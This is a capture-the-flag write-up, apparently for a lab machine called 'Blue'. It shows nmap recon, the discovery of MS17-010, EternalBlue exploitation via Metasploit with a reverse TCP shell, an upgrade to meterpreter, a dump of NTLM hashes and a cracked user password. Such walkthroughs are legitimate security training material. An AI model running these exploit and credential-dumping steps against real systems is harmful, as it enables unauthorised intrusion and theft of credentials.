# Blue

### Recon

* IP address : 10.10.40.115
* Open port  nmap -sC -sV 10.10.40.115
```
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
|_ssl-date: 2020-03-25T09:33:49+00:00; -4s from scanner time.
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49158/tcp open  msrpc          Microsoft Windows RPC
49160/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

```
* Vuln scan with nmap
```
# nmap -vv -sS --script vuln 10.10.40.115
```
```
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
---
### Gain Access
* USing MSF to exploit ms17-010
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit 

[*] Started reverse TCP handler on 10.9.18.201:4444 
[*] 10.10.40.115:445 - Using auxiliary/scanner/smb/smb_ms17_010 
...
C:\Windows\system32>whoami
whoami
nt authority\system

```
---
### Escalating
* Shell to meterpreter
```
post/multi/manage/shell_to_meterpreter

```
```
msf5 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.9.18.201:4444 -> 10.10.40.115:49244 (10.10.40.115)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.9.18.201:4433 -> 10.10.40.115:49262 (10.10.40.115)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 

```
* Users Found
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```
### Cracking 
[decode password](https://crackstation.net/)
```
password decoded with https://crackstation.net/
Jon:alqfna22
```

### Flags

* flag 1, 2, 3
```
meterpreter > search -f flag*.*
Found 6 results...
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
```